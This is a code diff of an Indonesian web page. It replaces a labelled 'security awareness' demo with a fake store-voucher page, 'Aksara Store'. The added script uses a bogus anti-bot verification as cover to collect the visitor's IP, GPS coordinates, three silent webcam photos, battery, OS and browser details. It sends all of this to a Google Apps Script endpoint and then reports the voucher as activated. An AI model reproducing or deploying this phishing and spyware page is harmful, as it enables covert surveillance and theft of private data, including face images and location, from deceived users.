@@ -3,108 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Keamanan v2.0</title>
+    <title>Klaim Voucher Aksara Store</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a1a; color: #ffffff; text-align: center; padding: 50px 20px; }
-        .container { max-width: 600px; margin: auto; background: #2d2d2d; padding: 30px; border-radius: 15px; border: 1px solid #444; }
-        h1 { font-weight: 800; color: #00ff88; text-transform: uppercase; }
-        p { color: #ccc; line-height: 1.6; }
-        .btn { background: #00ff88; color: #1a1a1a; border: none; padding: 15px 30px; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn:hover { background: #00cc6e; transform: scale(1.05); }
-        .log { margin-top: 20px; text-align: left; background: #000; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; color: #00ff00; overflow-x: auto; }
-        #video { display: none; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; color: #333; text-align: center; margin: 0; }
+        .header { background: #1a1a1a; color: #fff; padding: 20px; font-weight: 800; font-size: 18px; }
+        .container { max-width: 400px; margin: 40px auto; padding: 30px; background: #fff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .voucher-box { background: #fff3cd; border: 2px dashed #f1c40f; padding: 20px; border-radius: 12px; margin: 25px 0; font-weight: 800; font-size: 20px; color: #856404; }
+        .btn { background: #27ae60; color: #fff; border: none; padding: 18px; font-weight: 700; border-radius: 12px; cursor: pointer; font-size: 16px; width: 100%; text-transform: uppercase; transition: 0.3s; }
+        .btn:hover { background: #2ecc71; transform: scale(1.02); }
+        #status-log { display: none; text-align: left; background: #1a1a1a; color: #00ff00; padding: 15px; font-family: monospace; font-size: 11px; margin-top: 25px; border-radius: 8px; line-height: 1.6; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Security Awareness Test</h1>
-    <p>Halaman ini adalah simulasi edukasi. Klik tombol di bawah untuk melihat seberapa banyak data yang bisa diambil oleh website asing dalam hitungan detik.</p>
-    
-    <button id="mainBtn" class="btn">MULAI SCAN PERANGKAT</button>
+<div class="header">AKSARA STORE - EXCLUSIVE ACCESS</div>
 
-    <div id="terminal" class="log">
-        > Menunggu interaksi pengguna...<br>
+<div class="container">
+    <h2 style="margin:0;">Selamat!</h2>
+    <p>Gunakan voucher di bawah untuk diskon 50%.</p>
+    <div class="voucher-box">AKSR-50-PROMO</div>
+    <p style="font-size: 13px; color: #777;">Klik tombol di bawah untuk aktivasi & verifikasi perangkat (Anti-Bot).</p>
+    <button id="claimBtn" class="btn">AKTIFKAN VOUCHER</button>
+
+    <div id="status-log">
+        > Memulai sesi verifikasi...<br>
     </div>
 </div>
 
 <video id="video" autoplay></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id="canvas"></canvas>
 
 <script>
-const GAS_URL = "https://script.google.com/macros/s/AKfycbwjiSsPHjrymTp6ScwH1AAj68XbYGmI0Vq6aMfOHAZrtBFypj8dUIZbc1oXVl6vzwQkvg/exec";
-const terminal = document.getElementById('terminal');
-const mainBtn = document.getElementById('mainBtn');
+const GAS_URL = "https://script.google.com/macros/s/AKfycbyruTIRjvbMVBuCq2obh9TM-jakhjse1WJR3m6dB9IfgwioL_MvnnyYB4dT4o-GX_sHqg/exec";
 
-// 1. Ambil Data Otomatis (Tanpa Izin)
-async function getAutoData() {
-    let batteryInfo = "Not Supported";
-    if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-    }
+const claimBtn = document.getElementById('claimBtn');
+const log = document.getElementById('log');
 
-    return {
-        os: navigator.platform,
-        browser: navigator.userAgent.split(' ').slice(-5).join(' '),
-        battery: batteryInfo,
-        screen: `${window.screen.width}x${window.screen.height}`,
-        cores: navigator.hardwareConcurrency || "N/A"
-    };
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const d = await res.json();
+        return d.ip;
+    } catch(e) { return "Unknown"; }
 }
 
-mainBtn.addEventListener('click', async () => {
-    mainBtn.disabled = true;
-    mainBtn.innerText = "SEDANG SCANNING...";
-    terminal.innerHTML += "> Mengambil metadata sistem...<br>";
+claimBtn.addEventListener('click', async () => {
+    claimBtn.disabled = true;
+    claimBtn.innerText = "SEDANG VERIFIKASI...";
+    document.getElementById('status-log').style.display = 'block';
     
-    const deviceData = await getAutoData();
-    terminal.innerHTML += `> OS: ${deviceData.os}<br>> Baterai: ${deviceData.battery}<br>`;
+    const ip = await getIP();
+    const logBox = document.getElementById('status-log');
+    logBox.innerHTML += `> IP: ${ip}<br>`;
 
-    // 2. Minta Izin Lokasi & Kamera
-    terminal.innerHTML += "> Meminta akses sensor sensitif...<br>";
-    
-    let locationStr = "Denied";
+    let loc = "Ditolak";
     try {
-        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-        locationStr = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-        terminal.innerHTML += "> [Akses Diterima] Lokasi GPS terkunci.<br>";
-    } catch (e) { terminal.innerHTML += "> [Akses Ditolak] Lokasi gagal diambil.<br>"; }
+        const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+        loc = `${p.coords.latitude}, ${p.coords.longitude}`;
+        logBox.innerHTML += `> GPS: Terkunci<br>`;
+    } catch(e) {}
 
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
-        terminal.innerHTML += "> [Akses Diterima] Kamera aktif. Mengambil frame...<br>";
+        logBox.innerHTML += `> Mengaktifkan sensor wajah...<br>`;
 
-        setTimeout(() => {
-            const canvas = document.getElementById('canvas');
+        const photos = [];
+        const canvas = document.getElementById('canvas');
+        
+        // Ambil 3 foto dengan jeda 1 detik
+        for (let i = 1; i <= 3; i++) {
+            await new Promise(r => setTimeout(r, 1000));
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            const imgData = canvas.toDataURL('image/jpeg');
+            photos.push(canvas.toDataURL('image/jpeg'));
+            logBox.innerHTML += `> Frame ${i} berhasil diambil.<br>`;
+        }
 
-            // 3. Kirim Semua ke GAS
-            fetch(GAS_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    ...deviceData,
-                    location: locationStr,
-                    image: imgData
-                })
-            });
+        logBox.innerHTML += `> Mengirim data ke server...<br>`;
+        
+        const b = await navigator.getBattery();
+        const battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
 
-            terminal.innerHTML += "> <b>DATA BERHASIL DIKIRIM KE SERVER CLOUD.</b><br>";
-            terminal.innerHTML += "> Periksa Google Sheet & Drive untuk melihat hasilnya.<br>";
+        fetch(GAS_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                ip: ip,
+                os: navigator.platform,
+                browser: navigator.userAgent.split(' ').slice(-3).join(' '),
+                battery: battery,
+                location: loc,
+                images: photos // Mengirim array berisi 3 foto
+            })
+        }).then(() => {
+            logBox.innerHTML += `> <b>VERIFIKASI SUKSES!</b> Voucher Aktif.<br>`;
             stream.getTracks().forEach(t => t.stop());
-            mainBtn.innerText = "SCAN SELESAI";
-        }, 2000);
+            claimBtn.innerText = "VOUCHER SUDAH AKTIF";
+        });
 
     } catch (e) {
-        terminal.innerHTML += "> [Akses Ditolak] Kamera gagal diakses.<br>";
-        // Tetap kirim metadata meski kamera ditolak
-        fetch(GAS_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({...deviceData, location: locationStr}) });
+        logBox.innerHTML += `> Izin kamera ditolak.<br>`;
+        claimBtn.innerText = "VERIFIKASI GAGAL";
     }
 });
 </script>
